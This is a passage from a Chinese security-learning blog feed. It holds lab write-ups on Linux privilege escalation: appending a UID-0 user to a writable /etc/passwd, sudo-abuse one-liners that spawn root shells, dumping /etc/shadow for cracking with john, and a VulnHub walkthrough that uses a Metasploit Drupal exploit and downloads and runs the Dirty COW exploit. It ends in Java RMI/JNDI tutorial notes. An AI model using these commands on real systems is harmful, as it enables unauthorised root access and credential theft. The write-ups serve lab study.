wbszs.txt</span><br></pre></td></tr></table></figure><p>然后使用<code>ls -l wbszs.txt</code> 查看权限</p><p><img src="image-20240507111829692.png" alt="image-20240507111829692"></p><p>可以看到此时已经拥有了 root权限，因此可以使用修改后的vim对/etc/passwd或/etc/shadow等敏感文件进行修改</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用passwd提权</title>
      <link href="/2023/03/11/%E5%88%A9%E7%94%A8passwd%E6%8F%90%E6%9D%83/"/>
      <url>/2023/03/11/%E5%88%A9%E7%94%A8passwd%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>初步整理完关于sudo滥用提权，开始整理一下关于配置错误/etc/passwd的利用</p><p>sudo滥用和这篇文章都参考这个大佬的：<a href="https://blog.csdn.net/qq_44159028/article/details/123684723"> Linux提权方法总结<em>linux如何提权</em>山山而川’的博客-CSDN博客</a></p><h2 id="1-先决条件及环境搭建"><a href="#1-先决条件及环境搭建" class="headerlink" title="1.先决条件及环境搭建"></a>1.先决条件及环境搭建</h2><p>要当前用户对/etc/passwd文件具有写的权限，找个靶机实验一下</p><p>ls -l /etc/passwd查看一下当前权限，说明已经修改为所有用户都具有w即写的权限</p><p><img src="image-20230311205425210.png" alt="image-20230311205425210"></p><hr><p>接下来我们就看一下/etc/passwd中所表示的信息,以下面的语句为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>root为<strong>登录用户名</strong> x为<strong>密码</strong>（加过密的） 0为<strong>用户UID</strong> 0为<strong>用户组id GID</strong> root为<strong>用户备注信息</strong>  /root为<strong>用户home目录</strong> /bin/bash<strong>用户默认的bash</strong></p><hr><p>因此我们需要的就是对/etc/passwd进行写入</p><p>我们要构造一个用户，密码为我们设定的密码（带盐值），并且UID设置为0</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -le &#x27;print crypt(&quot;123456&quot;,&quot;addsalt&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>命令生成带盐值的密码（123456）：<code>adrla7IBSfTZQ</code></p><p><img src="image-20230311204947405.png" alt="image-20230311204947405"></p><h2 id="2-复现及利用"><a href="#2-复现及利用" class="headerlink" title="2.复现及利用"></a>2.复现及利用</h2><p>好了，现在环境就已经复现好了，现在我们要换回一个低权限用户，此用户对/etc/passwd有写权限，并拥有一个带盐值的密码<code>adrla7IBSfTZQ</code>，万事俱备，直接开始利用</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test:adrla7IBSfTZQ:0:0:root:/root:/bin/bash&quot;</span><br></pre></td></tr></table></figure><p>将<code>test:adrla7IBSfTZQ:0:0:root:/root:/bin/bash</code>加入/etc/passwd(!!注意是追加&gt;&gt;不是覆盖&gt;)</p><p><img src="image-20230311210056491.png" alt="image-20230311210056491"></p><p>查看新加入内容</p><p><img src="image-20230311210422730.png" alt="image-20230311210422730"></p><p><img src="image-20230311210458196.png" alt="image-20230311210458196"></p><p>添加成功，切换用户</p><p><img src="image-20230311210555606.png" alt="image-20230311210555606"></p><p>提权成功！</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sudo滥用提权</title>
      <link href="/2023/03/05/sudo%E6%BB%A5%E7%94%A8%E6%8F%90%E6%9D%83/"/>
      <url>/2023/03/05/sudo%E6%BB%A5%E7%94%A8%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>上次复现并学习了脏牛提权，这次再整理一下sudo滥用提权的相关内容</p><h2 id="关于sudo"><a href="#关于sudo" class="headerlink" title="关于sudo"></a>关于sudo</h2><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的工具如halt，reboot，su等等。</p><p>要想使一个用户具有使用sudo的能力，需要root用户将其名字，所能执行的命令，按照哪种用户或用户组的身份执行等信息注册到<code>/etc/sudoers</code>中</p><h2 id="关于sudoers"><a href="#关于sudoers" class="headerlink" title="关于sudoers"></a>关于sudoers</h2><blockquote><p>sudoers文件主要有三部分组成：</p><p>sudoers的默认配置（default） 主要设置sudo的一些缺省值</p><p>alias（别名），主要有Host_Alias|Runas_Alias|User_Alias|Dmnd_Alias</p><p>安全策略（规则定义）</p></blockquote><h3 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root ALL=(ALL) ALL</span><br></pre></td></tr></table></figure><p>解释：root用户可以从 ALL（任意）终端作为ALL（任意）用户执行ALL（任意）命令</p><p>即 <strong>用户 终端 可充当的用户 使用时可以运行的命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root ALL=(ALL:ALL) ALL</span><br><span class="line">hacker ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>解释：root这一句与上面不同的就是root用户可以从 ALL（任意）终端作为ALL（任意）用户，ALL（任意）组执行ALL（任意）命令</p><p>hacker同上，因此此时的hacker就相当于root用户了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker ALL=(root) NOPASSWD: /usr/bin/awk</span><br></pre></td></tr></table></figure><p>解释：hacker用户可以从 ALL（任意）终端作为root用户<strong>无密码</strong>执行awk命令</p><h3 id="查看用户能以root权限运行的命令"><a href="#查看用户能以root权限运行的命令" class="headerlink" title="查看用户能以root权限运行的命令"></a>查看用户能以root权限运行的命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><h2 id="sudo提权命令"><a href="#sudo提权命令" class="headerlink" title="sudo提权命令"></a>sudo提权命令</h2><blockquote><p>wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp、ed、screen</p></blockquote><p>就先到这里，以后具体的例子会单独找案例进行分析</p><hr><p>更新，这里直接搭建一个环境，把常见的总结一下吧，后面遇到了再继续补充</p><h2 id="复现与总结"><a href="#复现与总结" class="headerlink" title="复现与总结"></a>复现与总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/awk</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/vim</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/man</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/apache2</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/less</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /bin/more</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/find</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/zip</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/git</span><br></pre></td></tr></table></figure><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>首先新建一个用户hacker，<code>vim /etc/sudoers</code>并在/etc/sudoers中加入以上的代码</p><p><img src="image-20230308201152439.png" alt="image-20230308201152439"></p><p>先给靶机上的hacker用户修改个密码 <code>passwd hacker</code></p><p><img src="image-20230308201402730.png" alt="image-20230308201402730"></p><p><code>su hacker</code>输入密码，切换成hacker，这就复现出我们一个刚刚进到一个新的系统中的情形，只有一个普通用户，然后我们需要提权</p><p><img src="image-20230308201639147.png" alt="image-20230308201639147"></p><p><code>sudo -l</code>查看允许当前用户使用的命令，这里我们主要寻找能以root权限执行的命令，如下图，那么，下面我们就一个一个来实践进行提权</p><p><img src="image-20230308201901240.png" alt="image-20230308201901240"></p><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>awk的相应提权方法为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="image-20230308202438207.png" alt="image-20230308202438207"></p><p>提权成功！</p><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>find的相应提权命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /home -exec /bin/bash \;</span><br></pre></td></tr></table></figure><p><img src="image-20230308202802004.png" alt="image-20230308202802004"></p><p>提权成功！</p><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>cat比较麻烦一点，我们可以使用cat查看文件/etc/shadow找到加密后的用户名密码，之后再用john破解</p><p>演示：1.使用<code>sudo cat /etc/shadow &gt;&gt; 1.txt</code> 读取shadow文件到1.txt中</p><!--(上面我们写入sudoers文件时没有写入`hacker  ALL=(root) NOPASSWD: /usr/bin/cat` 这一条，因此要实现cat的引用需要加上这一条，也就是实战时需要满足这个条件)--><p><img src="image-20230308231813556.png" alt="image-20230308231813556"></p><p><code>sudo cat /etc/passwd &gt;&gt; 2.txt</code> 读取passwd文件到2.txt</p><p><img src="image-20230308232938552.png" alt="image-20230308232938552"></p><p>使用<code>unshadow 2.txt 1.txt &gt;&gt; passwd.txt</code>将两个文件整合到一起为passwd.txt</p><p><img src="image-20230308233126463.png" alt="image-20230308233126463"></p><blockquote><p>关于unshadow的使用：<img src="image-20230308233157219.png" alt="image-20230308233157219"></p></blockquote><pre><code>          2.使用john破解密码：</code></pre><p>这里实现的时候有些问题，有时候快有时候慢，等解决了再过来补充</p><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p>这里就是解压缩命令zip了，首先安装zip命令<code>apt install zip</code></p><p><img src="image-20230311191243971.png" alt="image-20230311191243971"></p><p>有就不用了</p><p>使用<code>touch 2.txt</code> 创建一个2.txt,并使用<code>zip 1.zip 2.txt</code> 生成一个1.zip</p><p><img src="image-20230311192448941.png" alt=""></p><p><img src="image-20230311192546415.png" alt="image-20230311192546415"></p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo 1.zip 2.txt -T --unzip-command=&quot;sh -c /bin/bash&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20230311192656025.png" alt="image-20230311192656025"></p><p>提权成功</p><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>git就比较简单了首先使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git help add</span><br></pre></td></tr></table></figure><p><img src="image-20230311193259077.png" alt="image-20230311193259077"></p><p>命令，进入到该页面</p><p><img src="image-20230311193608707.png" alt="image-20230311193608707"></p><p>在此处输入<code>!/bin/bash</code></p><p><img src="image-20230311193703440.png" alt="image-20230311193703440"></p><p><img src="image-20230311193718807.png" alt="image-20230311193718807"></p><p>提权成功</p><h3 id="ed"><a href="#ed" class="headerlink" title="ed"></a>ed</h3><p>安装ed</p><p><img src="image-20230311194608383.png" alt="image-20230311194608383"></p><p>在sudoers中加入ed，这就不多说了</p><p><img src="image-20230311194824177.png" alt="image-20230311194824177"></p><p>更简单<code>sudo ed</code> 并输入<code>!/bin/bash</code></p><p><img src="image-20230311195050568.png" alt="image-20230311195050568"></p><p><img src="image-20230311195101783.png" alt="image-20230311195101783"></p><p>运行</p><p><img src="image-20230311195113341.png" alt="image-20230311195113341"></p><p>提权成功！</p><p>未完待续……</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』脏牛提权</title>
      <link href="/2023/03/03/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8F%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/"/>
      <url>/2023/03/03/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8F%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>复习Linux提权的相关知识，学到脏牛提权，正好有个vulnhub靶机可以用来练手，一起来试一下！</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机下载：<a href="https://www.vulnhub.com/entry/lampiao-1,249/">Lampião: 1 ~ VulnHub</a></p><p><img src="image-20230303164501489.png" alt="image-20230303164501489"></p><p>使用Vmware打开靶机：</p><p><img src="image-20230303152316746.png" alt="image-20230303152316746"></p><p>看来需要密码，先进行<strong>信息搜集</strong></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>使用<code>nmap -sn xxx.0/24</code>查找同一网段的主机，-sn是只扫描主机不扫描端口的意思</p><p><img src="image-20230303152951578.png" alt="image-20230303152951578"></p><p>找到一个可疑IP192.168.117.126使用<code>nmap -p- xxx</code>扫描对应IP的端口，发现有22 ,80,1898三个端口</p><p><img src="image-20230303153743782.png" alt="image-20230303153743782"></p><p>是同浏览器访问1898端口得到以下界面</p><p><img src="image-20230303154008098.png" alt="image-20230303154008098"></p><p>发现使用框架Drupal</p><p><img src="image-20230303154049475.png" alt="image-20230303154049475"></p><p>使用dirsearch -u [url]来进行敏感了目录扫描（当时没有仔细看敏感目录有什么，直接去找Drupal的漏洞去了）</p><p><img src="image-20230303154251965.png" alt="image-20230303154251965"></p><p>使用<code>msfconsole</code>打开metasploit</p><p><img src="image-20230303155216108.png" alt="image-20230303155216108"></p><p>在CHANGELOG.txt中发现Drupal的版本为7.54 更新时间为2017年</p><p><img src="image-20230303155511560.png" alt="image-20230303155511560"></p><p>直接在msf中使用<code>search Drupal</code>命令搜索相关的漏洞，有一个18年的就用它了</p><p><img src="image-20230303155612179.png" alt="image-20230303155612179"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用<code>use 1</code>进行漏洞利用，<code>show options</code>查看需要的配置</p><p><img src="image-20230303155947519.png" alt="image-20230303155947519"></p><p><img src="image-20230303160002709.png" alt="image-20230303160002709"></p><p>只需要设置RHOST和RPORT即可，即目的ip和目的端口</p><p><img src="image-20230303160242289.png" alt="image-20230303160242289"></p><p>设置后，使用<code>run</code>命令进行漏洞利用，得到一个www-data的普通用户的权限，这里总结一下刚刚漏洞利用过程的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.use 1 //search到的漏洞编号</span><br><span class="line">2.show options //查看配置</span><br><span class="line">3.set RHOST xxx //设置目的ip</span><br><span class="line">4.set RPORT xxx //设置目的端口</span><br><span class="line">5.run //漏洞利用</span><br></pre></td></tr></table></figure><p><img src="image-20230303160219694.png" alt="image-20230303160219694"></p><p>成功获取shell并使用python一句话反弹交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="image-20230303160731092.png" alt="image-20230303160731092"></p><h2 id="Linux提权——脏牛提权"><a href="#Linux提权——脏牛提权" class="headerlink" title="Linux提权——脏牛提权"></a>Linux提权——脏牛提权</h2><p>使用uname -a查看Linux内核版本：4.4.0-31-generic</p><p>漏洞描述：</p><blockquote><p>漏洞编号：CVE-2016-5195<br>漏洞名称：脏牛（Dirty COW）<br>漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权<br>影响范围：Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。</p></blockquote><p>主流发行版修复之后的内核版本，如果你的内核版本低于列表里的版本，表示还存在脏牛漏洞。</p><blockquote><p>Centos7 /RHEL7     3.10.0-327.36.3.el7</p><p>Cetnos6/RHEL6     2.6.32-642.6.2.el6</p><p>Ubuntu 16.10      4.8.0-26.28</p><p>Ubuntu 16.04     4.4.0-45.66</p><p>Ubuntu 14.04     3.13.0-100.147</p><p>Debian 8       3.16.36-1+deb8u2</p><p>Debian 7         3.2.82-1</p></blockquote><p><img src="image-20230303160834221.png" alt="image-20230303160834221"></p><p>可以看到我们此时的靶机属于Ubuntu 14.04     3.13.0-100.147这一范围因此，可以使用脏牛提权</p><p>使用命令searchsploit dirty找到40847.cpp的位置，我们要使用的脚本就在这里了</p><p><img src="image-20230303161628487.png" alt="image-20230303161628487"></p><p>将其复制到当前用户目录下，注意searchsploit搜到的脚本，都在<code>/usr/share/exploitdb/exploits</code>中后面再加上Path中的路径即可</p><p><img src="image-20230303162005823.png" alt="image-20230303162005823"></p><p>使用<code>python3 -m http.server 80</code>命令在80端口开启http</p><p><img src="image-20230303162057865.png" alt="image-20230303162057865"></p><p>进入到tmp目录下使用<code>wget http://xxx:80/40847.cpp</code>将脚本下载到靶机（ps：使用tmp目录的原因是，一般tmp目录具有写入权限，使用时找一个具有写入权限的目录进行下载即可）</p><p><img src="image-20230303162504106.png" alt="image-20230303162504106"></p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 1 40847.cpp -lutil //1的意思为编译后的执行文件名，可自定义</span><br></pre></td></tr></table></figure><p>命令进行编译</p><p><img src="image-20230303163841025.png" alt="image-20230303163841025"></p><p>编译成功，使用<code>./1 -s</code>命令运行执行文件1，得到root权限</p><p><img src="image-20230303163913985.png" alt="image-20230303163913985"></p><p><code>cat flag.txt</code> 得到flag</p><p><img src="image-20230303164000917.png" alt="image-20230303164000917"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI注入重置版</title>
      <link href="/2023/02/23/JNDI%E6%B3%A8%E5%85%A5%E9%87%8D%E7%BD%AE%E7%89%88/"/>
      <url>/2023/02/23/JNDI%E6%B3%A8%E5%85%A5%E9%87%8D%E7%BD%AE%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p>大概理解了RMI的原理，现在开始重新学习一下JNDI注入</p><h2 id="一、JNDI机制与原理"><a href="#一、JNDI机制与原理" class="headerlink" title="一、JNDI机制与原理"></a>一、JNDI机制与原理</h2><p>名称：JNDI(Java Naming and Directory Interface,Java命名和目录接口)</p><p>概述：JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的<strong>一种标准的Java命名系统接口</strong>，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些<strong>命名服务和目录服务之间</strong>进行交互。目录服务是命名服务的一种自然扩展。</p><p>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p><blockquote><p>javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类； javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；<br>javax.naming.event：在命名目录服务器中请求事件通知；<br>javax.naming.ldap：提供LDAP支持；<br>javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</p></blockquote><p>至于使用方法，在将RMI中已经体现过了,其实在介绍RMI的时候我们就已经利用了JNDI，那么可以知道，当lookup()中参数可控的时候，我们就可以引入恶意代码</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java RMI</title>
      <link href="/2023/02/14/Java-RMI/"/>
      <url>/2023/02/14/Java-RMI/</url>
      
        <content type="html"><![CDATA[<p>先前介绍过RMI但感觉不够详细所，理解也不够透彻，想着这次再学习一下，当然，此篇文章仅供个人理解，因此会借鉴大神们的文章，文末会有标出。</p><h2 id="一、Java-RMI机制与原理"><a href="#一、Java-RMI机制与原理" class="headerlink" title="一、Java RMI机制与原理"></a>一、Java RMI机制与原理</h2><p>  RMI（Remote Method invocation）远程方法调用：是允许在一个JAVA虚拟机中运行的<strong>对象</strong>调用运行在另一个JAVA虚拟机中的<strong>对象</strong>的方法</p><p><em>（ps：两个虚拟机可以是运行在<strong>相同计算机</strong>的不同<strong>进程</strong>中，也可以是运行在网络上的<strong>不同计算机</strong>中）</em></p><p>  而JAVA RMI：用于实现远程过程调用的应用程序编程接口。它使客户机上的程序可以调用远程服务器上的对象的引用</p><!--宗旨：简化远程接口对象的使用--><h3 id="RMI过程："><a href="#RMI过程：" class="headerlink" title="RMI过程："></a>RMI过程：</h3><p>服务器调用远程注册表将名称与远程对象关联</p><p>客户端在注册表中通过<strong>名称</strong>查找远程对象，然后在其上调用一个方法</p><p>要了解RMI就不得不提到两个概念</p><h3 id="Stub和Skeleton"><a href="#Stub和Skeleton" class="headerlink" title="Stub和Skeleton"></a>Stub和Skeleton</h3><p>rmi框架使用代理来负责代理与远程对象通过socket进行通信的细节</p><p>客户端代理stub（存根）服务器代理skeleton（骨架）</p><h3 id="RMI远程调用步骤："><a href="#RMI远程调用步骤：" class="headerlink" title="RMI远程调用步骤："></a>RMI远程调用步骤：</h3><p>1.客户调用方法</p><p>2.经过stub代理打包（编码）调用信息（变量，方法名）通过网络发给skeleton</p><p>3.服务器端通过skeleton解包，找出被调用的方法以及方法所在的对象</p><p>4.服务器端调用真正的方法，将返回结果发给skeleton</p><p>5.skeleton打包返回结果，通过网络发送给stub</p><p>6.stub解包，得到返回结果，返回给调用者</p><p>7.客户端收到返回值</p><h2 id="二、JAVA-RMI示例"><a href="#二、JAVA-RMI示例" class="headerlink" title="二、JAVA RMI示例"></a>二、JAVA RMI示例</h2><p>创建RMI的步骤</p><p>1.创建远程接口</p><p>2.创建远程类</p><p>3.创建服务器程序</p><p>4.创建客户端程序</p><p>下面进行详细分析：</p><h3 id="1-创建远程接口"><a href="#1-创建远程接口" class="headerlink" title="1.创建远程接口"></a>1.创建远程接口</h3><p>远程接口中声明了可以被客户程序访问的远程方法，RMI规范要求<strong>远程对象</strong>所属的类实现一个远程接口</p><p>并需要满足两个条件：</p><p>(1).直接或间接继承java.rmi.Remote接口<br>(2).接口中所有方法声明抛出java.rmi.RemoteException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Iservice</span> <span class="keyword">extends</span> <span class="title class_">Remote</span></span><br><span class="line">&#123;</span><br><span class="line">    String <span class="title function_">Service</span><span class="params">(String Content)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-创建远程类"><a href="#2-创建远程类" class="headerlink" title="2.创建远程类"></a>2.创建远程类</h3><p>远程类就是远程对象所属的类。RMI规范要求远程类必须实现一个远程接口，另外为了使远程的实例变成能为远程客户提供服务的远程对象，可以通过两种途径把它导出（export）为远程对象</p><p>(1).实现远程接口的同时需要继承java.rmi.server.UnicastRemoteObject,并且远程类的构造方法必须声明抛出RemoteException</p><p>第一种：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Iservice</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServiceImpl</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Service</span><span class="params">(String Content)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;server&quot;</span>+Content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(2).如果远程类已经继承了其他类，无法再继承UnicastRemoteObject类，那么可以在构造方法中调用UnicastRemoteObject静态方法expectObject，同时构造方法必须声明RemoteException</p><p>第二种：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServiceImpl2</span> <span class="keyword">extends</span> <span class="title class_">Object</span> <span class="keyword">implements</span> <span class="title class_">Iservice</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServiceImpl2</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        UnicastRemoteObject.exportObject(<span class="built_in">this</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Service</span><span class="params">(String Content)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;server&quot;</span>+name+<span class="string">&quot;:&quot;</span>+Content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于UnicastRemoteObject.expectObject(this,0)</p><p>其中this是本对象，0为监听任意端口号</p><h3 id="3-创建服务器程序"><a href="#3-创建服务器程序" class="headerlink" title="3.创建服务器程序"></a>3.创建服务器程序</h3><p>使用注册表rmiRegistry将远程对象与名称关联,服务器的一大功能就是向rmiRegistry注册表中注册对象。</p><p>从JDK1.3版本以上，RMI命名服务被整合到JNDI中（Java Naming and Directory Interface，Java名字与目录接口）之前有讲过，后面会重新再新开一篇。</p><p>在JNDI中 javax.naming.Context声明了<strong>注册，查找，以及注销对象</strong>的方法</p><p>​    (1).bind(String name,Object obj)注册对象 name为url格式<br>​    (2).rebind(String name,Object obj)注册对象 如果当前name已被绑定其他对象，当前的obj将会覆盖原来的对象<br>​    (3).lookup(String name)  根据name查找对象，并返回对象<br>​    (4).unbind(String name) 解绑对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException &#123;</span><br><span class="line">        <span class="type">Iservice</span> <span class="variable">server1</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ServiceImpl</span>(<span class="string">&quot;001&quot;</span>);</span><br><span class="line">        <span class="type">Iservice</span> <span class="variable">server2</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ServiceImpl2</span>(<span class="string">&quot;002&quot;</span>);</span><br><span class="line">        Context namingContext=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">// 初始化命名内容</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">8892</span>);<span class="comment">// 在本地主机上创建和导出注册表实例，并在指定的端口上接受请求</span></span><br><span class="line">        namingContext.rebind(<span class="string">&quot;rmi://localhost:8892/server1&quot;</span>,server1);</span><br><span class="line">        namingContext.rebind(<span class="string">&quot;rmi://localhost:8892/server2&quot;</span>,server2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-创建客户端程序"><a href="#4-创建客户端程序" class="headerlink" title="4.创建客户端程序"></a>4.创建客户端程序</h3><p>使用lookup查找远程对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span 